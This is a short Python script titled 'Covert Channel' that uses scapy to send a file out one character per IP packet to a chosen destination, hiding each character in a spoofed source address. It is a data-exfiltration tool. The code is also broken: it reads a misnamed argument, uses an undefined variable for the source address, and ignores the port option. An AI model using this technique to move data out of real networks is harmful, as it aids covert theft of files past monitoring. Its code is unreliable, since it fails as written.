import argparse

from scapy.all import *
from scapy.layers.inet import IP

# Argparse setup
parser = argparse.ArgumentParser(description="Covert Channel")
parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
parser.add_argument('-f', '--file', dest='filename', help='File to send', required=True)
args = parser.parse_args()


def main():
    # Open the file to be sent
    with open(args.file, "r") as payloadFile:
        payload = payloadFile.read().rstrip('\n')

        # Iterate through payload and create/send one packet per char
        for byt in payload:
            uniCode = ord(byt)  # returns unicode int
            pack = IP(dst=args.dest, src="192.168.1." + pack)
            send(pack)